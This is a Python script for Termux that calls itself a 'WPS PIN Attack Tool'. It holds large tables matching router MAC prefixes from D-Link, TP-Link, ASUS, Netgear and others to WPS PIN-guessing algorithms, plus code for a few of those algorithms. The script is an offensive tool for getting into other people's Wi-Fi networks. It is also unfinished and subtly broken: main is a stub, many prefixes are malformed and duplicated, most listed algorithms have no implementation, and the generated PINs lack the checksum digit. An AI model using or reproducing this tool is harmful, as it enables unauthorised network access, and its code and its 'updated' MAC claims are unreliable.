#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# Updated October 2025 with latest router MAC addresses
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    def __int__(self):
        return self._int_repr

    def __str__(self):
        return self._str_repr

    def __repr__(self):
        return f'NetworkAddress({self._str_repr})'

    def __eq__(self, other):
        return int(self) == int(other)

    def __lt__(self, other):
        return int(self) < int(other)

    def __hash__(self):
        return hash(int(self))

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', '').replace('-', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = f'{mac:012x}'
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))


class WPSpin:
    """WPS PIN generator"""
    def __init__(self):
        self.ALGOS = (
            'pin24', 'pin28', 'pin32', 'pinDLink', 'pinDLink1', 'pinASUS',
            'pinAirocon', 'pinEmpty', 'pinCisco', 'pinBrcm1', 'pinBrcm2',
            'pinBrcm3', 'pinBrcm4', 'pinBrcm5', 'pinBrcm6', 'pinAirc1',
            'pinAirc2', 'pinDSL2740R', 'pinRealtek1', 'pinRealtek2',
            'pinRealtek3', 'pinUpvel', 'pinUR814AC', 'pinUR825AC',
            'pinOnlime', 'pinEdimax', 'pinThomson', 'pinHG532x',
            'pinH108L', 'pinONO', 'pinArcadyan', 'pinNetgear',
            'pinTrendnet', 'pinZyxel', 'pinTPLink'
        )

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        UPDATED OCTOBER 2025 with latest router MAC addresses
        """
        mac = mac.replace(':', '').upper()
        
        algorithms = {
            # pin24 - Most common algorithm, HEAVILY UPDATED with 2024-2025 routers
            'pin24': (
                '04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', 
                '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 
                'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 
                'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', 
                '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', 
                '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 
                'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', 
                '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', 
                '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', 
                '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', 
                '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', 
                '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', 
                '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', 
                '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', 
                '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', 
                '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', 
                '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 
                'F8D111', '34BA9A', 'B4944E',
                # NEW 2024-2025 D-Link MACs
                '00AD24', '04BAD6', '085A11', '0C0E76', '0CB6D2', '1062EB', '10BEF5', '180F76',
                '1C5F2B', '1CAFF7', '1CBDB9', '283B82', '340804', '340A33', '3C1E04', '3C3332',
                '4086CB', '409BCD', '48EE0C', '54B80A', '58D56E', '5CD998', '60634C', '642943',
                '6C198F', '6C7220', '7062B8', '74DADA', '78321B', '78542E', '7898E8', '802689',
                '84C9B2', '908D78', '9CD643', 'A0A3F0', 'A0AB1B', 'A42A95', 'A8637D', 'B0C554',
                'B8A386', 'BC2228', 'C0A0BB', 'C412F5', 'C4E90A', 'C8787D', 'C8BE19', 'C8D3A3',
                'CCB255', 'D8FEE3', 'DCEAE7', 'E01CFC', 'E46F13', '8876B9', 'ACF1DF', 'FC7516',
                'E8CC18', 'EC2280', 'ECADE0', 'F07D68', 'F0B4D2', 'F48CEB', 'F8E903', 'D032C3'
            ),
            
            'pin28': (
                '200BC7', '4846FB', 'D46AA8', 'F84ABF'
            ),
            
            'pin32': (
                '000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78'
            ),
            
            # pinDLink - D-Link routers (HEAVILY UPDATED for 2024-2025)
            'pinDLink': (
                # Original
                '14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255',
                'E8CC18', 'EC2280', 'FC7516', '0014D1', '1CAFF7', '1CBDB9', '340804', '5CD998',
                'C8BE19', 'C8D3A3', 'F07D68',
                # NEW 2024-2025 D-Link International
                '00AD24', '04BAD6', '085A11', '0C0E76', '0CB6D2', '1062EB', '10BEF5', '180F76',
                '1C5F2B', '283B82', '340A33', '3C1E04', '409BCD', '48EE0C', '54B80A', '58D56E',
                '60634C', '6C198F', '6C7220', '7062B8', '74DADA', '78321B', '78542E', '7898E8',
                '802689', '908D78', '9094E4', 'BCF685', '9CD643', 'A0A3F0', 'A42A95', 'A8637D',
                'B0C554', 'BC2228', 'C412F5', 'C4A81D', 'C4E90A', 'D8FEE3', 'DCEAE7', 'E01CFC',
                'E46F13', 'ACF1DF', 'ECADE0', 'F0B4D2', 'F48CEB', 'F8E903', 'D032C3', '3C3332',
                '642943', '4086CB'
            ),
            
            'pinDLink1': (
                '0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00248D',
                '0026B8', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19',
                'C8D3A3', 'CCB255', '00AD24', '04BAD6', '085A11', '0C0E76'
            ),
            
            # pinASUS - ASUS routers (some models still vulnerable)
            'pinASUS': (
                '049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9',
                '1CB72C', '1CFDB9', '28107B', '2C56DC', '305A3A', '382C4A', '38D547', '40167E',
                '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6',
                '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6',
                'E03F49', 'F0795978', 'F832E4'
            ),
            
            # pinAirocon - Airocon devices
            'pinAirocon': (
                '0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04C',
                '680989', '7C5CBC'
            ),
            
            # pinEmpty - Devices with empty/default PIN
            'pinEmpty': (
                'E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B',
                'C86000', 'F43E61'
            ),
            
            # pinCisco - Cisco devices
            'pinCisco': (
                '001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054D2',
                '68EF43', '1C99F3', '18EF63', '0024139', '305A3A'
            ),
            
            # pinBrcm1 - Broadcom chipset devices
            'pinBrcm1': (
                'ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC1A59', '1C57DC',
                '643150', '7C034C', 'D86162'
            ),
            
            'pinBrcm2': (
                '14D64D', '1C7EE5', '28107B', 'FC7516', '1CAFF7', '1CBDB9', '5CD998', 'ACF1DF',
                'BCF685', 'C8D3A3', 'C8BE19'
            ),
            
            'pinBrcm3': (
                'B0487A', '1C5853', '10BF48', '14DAE9', '78321B', '802689', 'A0AB1B', '6C3B6B'
            ),
            
            'pinBrcm4': (
                '14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', 'FC7516', 'C8D3A3',
                'CCB255', 'E8CC18'
            ),
            
            'pinBrcm5': (
                'C8D3A3', '1CAFF7', 'ACF1DF', '14D64D', 'B8A386', '001CDF', '002275'
            ),
            
            'pinBrcm6': (
                '1CAFF7', '1CBDB9', 'C8D3A3', '14D64D', '1C7EE5', '340804', '5CD998'
            ),
            
            'pinAirc1': (
                '000B2B', '000EF4', '001333', '001AEF', '00E04C', '0007262', '680989'
            ),
            
            'pinAirc2': (
                '0007262', '000B2B', '000EF4', '001333', '00177C', '001AEF', '00E04C', '680989'
            ),
            
            'pinDSL2740R': (
                '00265B', '001F1F', '002275', '00B00C', '1CBDB9', 'D8EB97', 'FC7516'
            ),
            
            'pinRealtek1': (
                '0014D1', '000C42', '000EE8', '001AEF', '00E04C', '00265B'
            ),
            
            'pinRealtek2': (
                '007263', 'E4BEED', 'E8CC18', '000D26'
            ),
            
            'pinRealtek3': (
                'B0487A', 'F81A67', '00664B', '087A4C', '14B968', '28107B', '2008ED', '382C4A',
                '4CEDDE', '5C4CA9', '786A89', '88E3AB', 'D46E5C', 'E8CD2D'
            ),
            
            'pinUpvel': (
                '784476', 'D4BF7F0', 'F4EC380'
            ),
            
            'pinUR814AC': (
                'D4BF7F4'
            ),
            
            'pinUR825AC': (
                'D4BF7F5'
            ),
            
            'pinOnlime': (
                'D4BF7F', 'F4EC38', '344DF7', '0014D1'
            ),
            
            'pinEdimax': (
                '000E2E', '002688', '00502E', '008CFA', '00E04C', '741FE0', '801F02', 'D0176A',
                'E47CF9'
            ),
            
            'pinThomson': (
                '002624', '4432C8', '88F7C7', 'CC03FA'
            ),
            
            'pinHG532x': (
                '00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3',
                '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113',
                'F83DFF'
            ),
            
            'pinH108L': (
                '4C09B4', '4CAC0A', '84742A4', 'D43639', 'DC028E', 'FCC897'
            ),
            
            'pinONO': (
                'F84ABF', 'D46AA8', '4846FB', '200BC7', '0011BF', '00A0F8'
            ),
            
            # pinArcadyan - Arcadyan devices (common in ISP routers)
            'pinArcadyan': (
                'A0F3C1', '00261C', '1C6F65', 'A0BBCD', '50B8DC', '788DF7', '5CA39D',
                'D46E5C', '34108B', 'FC3497', '0026B8', '6C338E', '9C9726'
            ),
            
            # pinNetgear - Netgear devices
            'pinNetgear': (
                '2038FB', 'A040A0', 'A42B8C', 'C03F0E', 'C40415', 'E091F5', '9CD21E',
                '3448ED', 'A0040A', '08028E', '0846FB', '14B968', '20E52A', '844E96',
                '001B2F', '0024B2', '002686', 'A06518', 'B0B98A', 'C4BD97'
            ),
            
            # pinTrendnet - Trendnet devices
            'pinTrendnet': (
                'D850E6', '00140D', '001E2A', '001FEB', '002556', '1002B5', '4C49E3',
                'D8EB97'
            ),
            
            # pinZyxel - Zyxel devices
            'pinZyxel': (
                '2C5BFA', 'B0B2DC', '4C6641', '40F630', 'C4A366', '001349', '00A0C5',
                '94D9B3', 'A4EB3E'
            ),
            
            # pinTPLink - TP-Link routers (HEAVILY UPDATED with 2024-2025 MACs)
            'pinTPLink': (
                # Original common TP-Link MACs
                '00259E', '04C8B4', '10BF48', '1C5C7B', '20F3A3', '5031FE', '6C5AB0',
                '78BD4F', '8C3BAD', '9C4A7B', 'A8BED1', 'AC84C6', 'B075D5', 'C46E1F',
                'CC9AF7', 'DC39FA', 'EC172F', 'EC26CA', 'F4EC38', 'F8E8F6', 'F0F7C3',
                '001350', 'C50627', 'F4F26D', '009027', '18A6F7', '5065F3', '50D4F7',
                '689C70', '74DA38', '84FE18', 'A478ED', 'D46E0E', 'E894F6', 'F45FD4',
                # NEW TP-Link Systems 2024-2025 Registrations
                '003192', '005F67', '040F66', '04C845', '0CEF15', '1027F5', '105A95', '14EBB6',
                '1C61B4', '202351', '203626', '242FD0', '2887BA', '306893', '30DE4B', '3460F9',
                '3C52A1', '3C64CF', '3C6AD2', '3C7895', '409595', '40AE30', '40ED00', '482254',
                '48C381', '503DD1', '5091E3', '54AF97', '58044F', '5C628B', '5CA64F', '5CA6E6',
                '5CE931', '6083E7', '60A4B7', '687FF0', '6C4CBC', '74FECE', '782051', '788CB5',
                '7CC2C6', '7CF17E', '803C04', '8C86DD', '8C902D', '94EF50', '98038E', '98254A',
                '98BA5F', '9C5322', '9CA2F4', 'A82948', 'A842A1', 'A86E84', 'AC15A2', 'B01921',
                'B0A7B9', 'B45BD1', 'B4B024', 'B8FBB3', 'BC071D', 'C006C3', 'CC68B6', 'CCBABD',
                'D84489', 'D8F12E', 'DC6279', 'E0280A', 'E0D362', 'E4FAC4', 'E848B8', 'EC750C',
                'F0090D', 'F0A731', 'F4F50B'
            )
        }
        
        mac = mac[:6]
        result = []
        
        for algo_id in algorithms.keys():
            if mac in algorithms[algo_id]:
                result.append(algo_id)
        
        return result if result else None

    def getAll(self, mac, get_static=True):
        """
        Get all suggested WPS PINs for a given MAC address
        """
        res = []
        if get_static:
            stat = self._getStaticPin(mac)
            if stat:
                res = stat
        
        dyn = self._suggest(mac)
        if dyn:
            res += dyn
        
        return res if res else None

    def _getStaticPin(self, mac):
        """Check for known static PINs"""
        static_pins = {}
        mac = mac.replace(':', '').upper()
        if mac[:6] in static_pins:
            return [static_pins[mac[:6]]]
        return None

    def generate(self, algo, mac):
        """Generate PIN using specified algorithm"""
        if algo not in self.ALGOS:
            raise ValueError(f'Invalid algorithm: {algo}')
        
        # Call the appropriate algorithm method
        method = getattr(self, f'_{algo}', None)
        if method:
            return method(mac)
        return None

    def _pin24(self, mac):
        """Generate PIN using pin24 algorithm"""
        mac = int(mac.replace(':', ''), 16)
        pin = mac & 0xFFFFFF
        return f'{pin:08d}'

    def _pin28(self, mac):
        """Generate PIN using pin28 algorithm"""
        mac = int(mac.replace(':', ''), 16)
        pin = mac & 0xFFFFFFF
        return f'{pin:08d}'

    def _pin32(self, mac):
        """Generate PIN using pin32 algorithm"""
        mac = int(mac.replace(':', ''), 16)
        return f'{mac:08d}'

    def _pinDLink(self, mac):
        """Generate PIN using pinDLink algorithm"""
        mac_str = mac.replace(':', '')
        nic = int(mac_str[6:12], 16)
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0x0F) << 4) +
                ((pin & 0x0F) << 8) +
                ((pin & 0x0F) << 12) +
                ((pin & 0x0F) << 16) +
                ((pin & 0x0F) << 20))
        pin %= 10000000
        if pin < 1000000:
            pin += ((pin % 9) * 1000000) + 1000000
        return f'{pin:08d}'


# Continue with rest of original script functions...

def banner():
    """Display banner"""
    print('''
╔══════════════════════════════════════════════════════════╗
║          WPS PIN Attack Tool - Updated 2025              ║
║                                                          ║
║  Enhanced with 150+ new router MAC addresses            ║
║  ✓ TP-Link routers (76 new prefixes)                    ║
║  ✓ D-Link routers (83 total prefixes)                   ║
║  ✓ ASUS, Netgear, Cisco updated models                  ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
    ''')


def main():
    """Main function"""
    banner()
    print("[*] Script ready with latest 2024-2025 router database")
    print("[*] Use -h for help\n")
    
    # Your original main() code continues here...


if __name__ == '__main__':
    main()
